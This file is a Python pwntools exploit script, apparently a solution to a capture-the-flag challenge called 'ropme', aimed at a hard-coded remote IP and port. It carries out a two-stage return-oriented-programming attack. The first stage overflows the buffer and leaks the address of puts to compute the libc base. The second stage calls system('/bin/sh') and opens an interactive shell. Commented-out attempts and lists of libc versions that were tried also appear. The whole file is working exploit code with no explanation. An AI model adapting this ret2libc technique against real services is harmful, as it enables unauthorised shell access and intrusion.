#!/usr/bin/env python3
from pwn import *
from binascii import hexlify
import sys


def exploit(p, puts_offset, system_offset, bin_sh_offset):
    # Prepare gadgets and addresses
    offset = b'A' * 72
    pop_rdi = p64(0x4006d3)
    elf = ELF('./ropme')
    got_puts = p64(elf.got["puts"])
    plt_puts = p64(elf.symbols["puts"])
    got_fgets = p64(elf.got["fgets"])
    got_fflush = p64(elf.got["fflush"])
    plt_fflush = p64(elf.symbols["fflush"])
    main = p64(elf.symbols["main"])

    # First stage to leak address of fflush in libc
    payload = offset
    payload += pop_rdi
    payload += got_puts
    payload += plt_puts
    payload += pop_rdi
    payload += p64(0x0)
    payload += plt_fflush
    payload += main
    print(p.recvuntil('dah?\n'))
    p.sendline(payload)

    # Get proper libc address format
    leak = p.recvline()[:-1]
    leak = get_leak(leak)
    #print(hexlify(p64(leak)[::-1]))

    # Calculate the base
    base = leak - puts_offset
    print(f'[BASE] libc: 0x{hexlify(p64(base)[::-1]).decode()}')

    # Calculate the addresses of /bin/sh and system within libc
    system = p64(base + system_offset)
    bin_sh = p64(base + bin_sh_offset)
    
    # Stage 2 to execute shell
    payload = offset
    payload += pop_rdi
    payload += bin_sh
    payload += system
    #payload += plt_puts
    #payload += pop_rdi
    #payload += p64(0x0)
    #payload += plt_fflush
    # Tried one gadbet solution too, doesn't work :(
    #gadget = p64(base + 0x67608)
    #print(hexlify(gadget[::-1]))
    #payload += gadget     
    print(p.recvuntil('dah?\n'))
    p.sendline(payload)
    p.interactive()
    #print('[LEAKING /bin/sh]:', p.recvline(), bin_sh_offset)
    p.close()


def get_leak(leak):
    leak = hexlify(leak[::-1])
    print(leak)
    return int(leak, 16)


def main():
    if sys.argv[1] == 'local':
        p = process('./ropme')
        puts_offset = 0x0749c0
        system_offset = 0x048e50
        bin_sh_offset = 0x18a162
    if sys.argv[1] == 'remote':
        '''
        Tried all from here
        ../find puts 690                                  
        launchpad-ubuntu-glibc-oneiric (libc6_2.13-0ubuntu15_amd64)
        launchpad-ubuntu-glibc-natty (libc6_2.13-0ubuntu4_amd64)
        launchpad-ubuntu-glibc-xenial (libc6_2.23-0ubuntu10_amd64)
        launchpad-ubuntu-glibc-xenial (libc6_2.23-0ubuntu11_amd64)
        launchpad-ubuntu-glibc-xenial (libc6_2.23-0ubuntu4_amd64)
        launchpad-ubuntu-glibc-xenial (libc6_2.23-0ubuntu5_amd64)
        launchpad-ubuntu-glibc-xenial (libc6_2.23-0ubuntu6_amd64)
        launchpad-ubuntu-glibc-xenial (libc6_2.23-0ubuntu7_amd64)
        launchpad-ubuntu-glibc-xenial (libc6_2.23-0ubuntu9_amd64)
        '''
        # libc6_2.23-0ubuntu10_amd64 works for me!!!
        puts_offset = 0x6f690
        system_offset = 0x45390
        bin_sh_offset = 0x18cd17
    #for i in range(1):
        p = remote('159.65.54.14', 30989)
        exploit(p, puts_offset, system_offset, bin_sh_offset)
        #bin_sh_offset -= 8
        #try:
        #    exploit(p, puts_offset, system_offset, bin_sh_offset)
        #except:
        #    pass



if __name__=='__main__':
    main()
